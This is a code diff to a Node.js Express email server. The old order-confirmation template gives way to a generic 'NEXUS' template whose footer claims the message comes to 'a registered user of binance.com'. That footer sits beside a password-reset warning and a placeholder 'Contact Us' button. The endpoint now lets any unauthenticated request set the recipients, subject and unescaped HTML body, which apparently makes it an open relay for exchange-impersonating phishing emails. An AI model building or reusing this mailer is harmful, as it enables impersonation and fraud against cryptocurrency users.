@@ -29,245 +29,196 @@ const sendEmail = (to, subject, htmlContent) => {
 };
 
 // Define a function to construct the HTML email template
-const constructEmailHTML = (accountId, accountName, phoneNumber, orderType, orderAmount, accountBalance, time) => {
-    let htmlContent = `
+const constructEmailHTML = (heading, paragraph) => {
+    return `
     <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Nexus</title>
+    <title>Email Notification</title>
     <style>
         body {
-            font-family: 'Arial', sans-serif;
-            background-color: #ffffff; /* White background */
+            font-family: Arial, sans-serif;
+            background-color: #f3f3f3;
             margin: 0; /* Remove default margin */
             padding: 0; /* Remove default padding */
-            width: 100%; /* Full width */
-            -webkit-text-size-adjust: 100%; /* Prevent font scaling in iOS */
         }
         .container {
-            max-width: 600px; /* Maximum width */
-            width: 100%; /* Full width */
-            margin: 0 auto; /* Center the container */
-            padding: 0; /* Remove padding */
-            background-color: #ffffff; /* White background */
-            border-radius: 0; /* Remove border radius */
-            box-shadow: none; /* Remove shadow */
-            box-sizing: border-box; /* Include padding in total width */
+            max-width: 600px;
+            margin: 0 auto; /* Ensure the content is centered */
+            background-color: #ffffff;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            overflow: hidden;
         }
-        h2 {
-    color: #4CAF50;
-    text-align: left; /* Align left */
-    margin: 0; /* Remove space above and below */
-    padding: 0 15px; /* Minimal padding */
-    line-height: 24px; /* Set line height to match icon size */
-    margin-left: 10px; /* Space between icon and heading */
-}
-        .nexus-header {
-    display: flex; /* Use flexbox for alignment */
-    align-items: center; /* Center items vertically */
-    padding: 0 15px; /* Minimal padding */
-    margin-bottom: 15px; /* Add space below the header */
-}
-
-.nexus-icon {
-    width: 24px; /* Adjust size */
-    height: 24px; /* Adjust size */
-    margin-right: 10px; /* Space between icon and text */
-}
-        p {
-            font-size: 14px; /* Standard font size */
-            color: #333;
-            margin: 5px 0; /* Reduced margins */
-            padding: 0 15px; /* Minimal padding */
-            text-align: left; /* Align left */
+        .header {
+            background-color: #101010;
+            padding: 5px; /* Further reduced padding for smaller header */
+            text-align: center;
         }
-        .small-text {
-            font-size: 12px; /* Smaller font size for specific text */
+        .header img {
+            width: 40px; /* Smaller logo */
+            margin-bottom: 2px; /* Minimal space between image and text */
         }
-        .smaller-text {
-            font-size: 12px; /* Same size for consistency */
-        }
-        .order-summary {
-            margin: 10px 0; /* Reduced margin */
-        }
-        .details-table {
-            width: 100%; /* Full width */
-            border-collapse: collapse; /* Remove gaps between cells */
-            margin: 10px 0; /* Reduced margin */
-            font-size: 14px;
-            color: #333;
-        }
-        .details-table thead {
-            background-color: #4CAF50; /* Header background */
-            color: #fff;
-        }
-        .details-table th, .details-table td {
-            padding: 10px; /* Padding for cells */
-            border: 1px solid #ddd; /* Light border */
-            text-align: left;
-        }
-        .details-table th {
+        .header h1 {
+            font-size: 14px; /* Smaller font size for compact text */
+            color: #ffffff;
+            margin: 0;
             font-weight: bold;
         }
-        .details-table tbody tr {
-            background-color: #ffffff; /* White background for rows */
+        .content {
+            padding: 20px;
+        }
+        .content h2 {
+            font-size: 18px;
+            color: #101010;
+            margin: 0 0 15px;
+        }
+        .content p {
+            font-size: 14px;
+            color: #333;
+            margin: 10px 0;
+            line-height: 1.5;
+        }
+        .button {
+            display: block;
+            width: 200px;
+            margin: 20px auto;
+            padding: 10px 0;
+            background-color: #1A7EB1; /* Button color changed */
+            color: #fff;
+            text-align: center;
+            text-decoration: none;
+            border-radius: 4px;
+            font-weight: bold;
         }
         .footer {
-            text-align: left; /* Align left */
+            padding: 10px 20px;
             font-size: 12px;
-            color: #888;
-            margin-top: 10px; /* Reduced margin */
-            padding: 0; /* No padding */
-        }
-        .footer p {
-            margin: 5px 0;
+            color: #555;
         }
         .footer a {
-            color: #4CAF50;
+            color: #f3ba2f;
             text-decoration: none;
         }
-        /* Icons */
-        .icon {
-            display: inline-block;
-            width: 20px;
-            height: 20px;
-            margin-right: 10px;
-            vertical-align: middle;
+        .footer strong {
+            display: block;
+            margin-top: 15px;
+            color: #101010;
         }
-        .icon-account-id {
-            background-image: url('https://img.icons8.com/ios-filled/50/4caf50/identification-documents.png');
-            background-size: contain;
+        .small-text {
+            font-size: 10px;
+            color: #888;
+            text-align: left; /* Align text to the left */
+            margin-top: 20px;
+            padding-left: 20px; /* Padding to ensure it aligns well */
         }
-        .icon-account {
-            background-image: url('https://img.icons8.com/ios-filled/50/4caf50/user.png');
-            background-size: contain;
+        .copyright {
+            text-align: center;
+            font-size: 10px;
+            color: #888;
+            margin-top: 20px;
         }
-        .icon-phone {
-            background-image: url('https://img.icons8.com/ios-filled/50/4caf50/phone.png');
-            background-size: contain;
+        .line-above {
+            border-top: 1px solid #ddd;
+            margin: 0; /* Removed margin after the line */
         }
-        .icon-wallet {
-            background-image: url('https://img.icons8.com/ios-filled/50/4caf50/wallet.png');
-            background-size: contain;
+        .line-below {
+            border-bottom: 1px solid #ddd;
+            margin: 0; /* No margin to ensure tightness */
         }
-        .icon-shopping-cart {
-            background-image: url('https://img.icons8.com/ios-filled/50/4caf50/shopping-cart.png');
-            background-size: contain;
+        .disclaimer {
+            font-size: 10px;
+            color: #888;
+            margin: 0; /* Ensures no margin around this section */
+            padding: 0; /* No padding around this section */
+            text-align: left; /* Align text to the left */
+            padding-left: 20px; /* Align text to the left with some padding */
         }
-        .icon-money-bag {
-            background-image: url('https://img.icons8.com/ios-filled/50/4caf50/money-bag.png');
-            background-size: contain;
+        .disclaimer-header {
+            font-size: 16px;
+            font-weight: bold;
+            color: #101010;
+            text-align: center;
+            margin: 15px 0;
         }
-        .icon-clock {
-            background-image: url('https://img.icons8.com/ios-filled/50/4caf50/clock.png');
-            background-size: contain;
+        .reduced-size {
+            font-size: 12px; /* Reduced font size */
+        }
+        /* Remove underline and set color of Privacy policy link */
+        .disclaimer a {
+            color: #1A7EB1; /* Set color to match button */
+            text-decoration: none; /* Remove underline */
         }
     </style>
 </head>
 <body>
+    <div class="container">
+        <!-- Header Section -->
+        <div class="header">
+            <img src="https://i.imgur.com/6e1pFka.png" alt="Custom Logo">
+            <h1>NEXUS</h1>
+        </div>
+        
+        <!-- Content Section -->
+        <div class="content">
+            <h2>${heading}</h2>
+            <p>${paragraph}</p>
+            <a href="#" class="button">Contact Us</a>
+            <!-- Reduced font size for this paragraph -->
+            <p class="reduced-size">Don’t recognize this activity? Please reset your password and contact customer support immediately.</p>
+        </div>
 
-    <table width="100%" cellpadding="0" cellspacing="0" border="0" style="border-collapse: collapse; padding: 0; margin: 0;">
-        <tr>
-            <td align="center" style="padding: 0; margin: 0;">
-                <div class="container">
-                    <div class="nexus-header">
-                        <img src="https://i.imgur.com/pXBkAwq.png" alt="Nexus Icon" class="nexus-icon"> 
-                        <h2>Nexus</h2>
-                    </div>
+        <!-- Line Above Disclaimer Section -->
+        <div class="line-above"></div> <!-- Horizontal line above the disclaimer text -->
 
-                    <p>Dear {{accountName}},</p>
-                    <p>We have received your order. Below are the details:</p>
+        <!-- Disclaimer Header: Stay Safe -->
+        <div class="disclaimer-header">
+            <p>Stay Safe</p>
+        </div>
 
-                    <div class="order-summary">
-                        <table class="details-table">
-                            <thead>
-                                <tr>
-                                    <th style="width: 50%;">Details</th>
-                                    <th style="width: 50%;">Information</th>
-                                </tr>
-                            </thead>
-                            <tbody>
-                                <tr>
-                                    <td><span class="icon icon-account-id"></span>Account ID</td>
-                                    <td>{{accountId}}</td>
-                                </tr>
-                                <tr>
-                                    <td><span class="icon icon-account"></span>Account Name</td>
-                                    <td>{{accountName}}</td>
-                                </tr>
-                                <tr>
-                                    <td><span class="icon icon-phone"></span>Phone Number</td>
-                                    <td>{{phoneNumber}}</td>
-                                </tr>
-                                <tr>
-                                    <td><span class="icon icon-shopping-cart"></span>Order Type</td>
-                                    <td>{{orderType}}</td>
-                                </tr>
-                                <tr>
-                                    <td><span class="icon icon-money-bag"></span>Order Amount</td>
-                                    <td>{{orderAmount}}</td>
-                                </tr>
-                                <tr>
-                                    <td><span class="icon icon-wallet"></span>Account Balance</td>
-                                    <td>{{accountBalance}}</td>
-                                </tr>
-                                <tr>
-                                    <td><span class="icon icon-clock"></span>Time</td>
-                                    <td>{{time}}</td>
-                                </tr>
-                            </tbody>
-                        </table>
-                    </div>
+        <!-- Disclaimer Text Section Below the Line -->
+        <div class="disclaimer">
+            <p>You have received this email as a registered user of binance.com.<br>For more information about how we process data, please see our <a href="#">Privacy policy</a>.</p>
+            <p>This is an automated message, please do not reply.</p>
+            <p>Stay connected!</p>
+        </div>
 
-                    <p class="smaller-text">Thank you for using Nexus. Your order will be processed shortly.</p>
-                    <p class="small-text">If you do not recognize this order, please contact our support team.</p>
+        <!-- Line Below Disclaimer Section -->
+        <div class="line-below"></div> <!-- Horizontal line below the disclaimer text -->
 
-                    <div class="footer">
-                        <p class="small-text">This is an automated message. Please do not reply.</p>
-                        <p style="text-align: center;"><a href="#">Visit our website</a> | <a href="#">Contact Support</a></p>
-                    </div>
-                </div>
-            </td>
-        </tr>
-    </table>
-
+        <!-- Copyright Text (Centered) -->
+        <div class="copyright">
+            <p>© 2024 Nexus, All Rights Reserved.</p>
+        </div>
+    </div>
 </body>
 </html>
     `;
-    
-    // Replace placeholders with actual values
-    htmlContent = htmlContent
-        .replace(/{{accountId}}/g, accountId)
-        .replace(/{{accountName}}/g, accountName)
-        .replace(/{{phoneNumber}}/g, phoneNumber)
-        .replace(/{{orderType}}/g, orderType)
-        .replace(/{{orderAmount}}/g, orderAmount)
-        .replace(/{{accountBalance}}/g, accountBalance)
-        .replace(/{{time}}/g, time);
-    
-    return htmlContent;
 };
 
 // Endpoint to handle sending the email
 app.post('/api/send-email', async (req, res) => {
-    const adminEmail = 'okiapeter50@gmail.com'; // Email for the admin or default recipient
+    const { adminEmail, heading, paragraph, userEmail, subject } = req.body;
 
-    // Extract order details from the request body, including user email
-    const { accountId, accountName, orderType, orderAmount, accountBalance, phoneNumber, userEmail } = req.body;
-    const time = new Date().toLocaleString('en-US', { timeZone: 'Africa/Kampala' }); // Get the current time in Uganda
+    // Validate required fields
+    if (!heading || !paragraph || !subject) {
+        return res.status(400).json({ success: false, message: 'Missing required fields: heading, paragraph, or subject.' });
+    }
 
     // Construct the HTML email content
-    const emailHTML = constructEmailHTML(accountId, accountName, phoneNumber, orderType, orderAmount, accountBalance, time);
+    const emailHTML = constructEmailHTML(heading, paragraph);
 
     try {
         // Send email to admin
-        await sendEmail(adminEmail, 'New Order Received', emailHTML);
+        if (adminEmail) {
+            await sendEmail(adminEmail, subject, emailHTML);
+        }
 
         // If the user provided an email, send them an email as well
         if (userEmail) {
-            await sendEmail(userEmail, 'Order Confirmation', emailHTML);
+            await sendEmail(userEmail, subject, emailHTML);
         }
 
         res.status(200).json({ success: true, message: 'Emails sent successfully!' });
@@ -276,7 +227,6 @@ app.post('/api/send-email', async (req, res) => {
         res.status(500).json({ success: false, message: 'Failed to send email.' });
     }
 });
-
 
 // Start the server
 const PORT = process.env.PORT || 5000; // Use the specified port or default to 5000
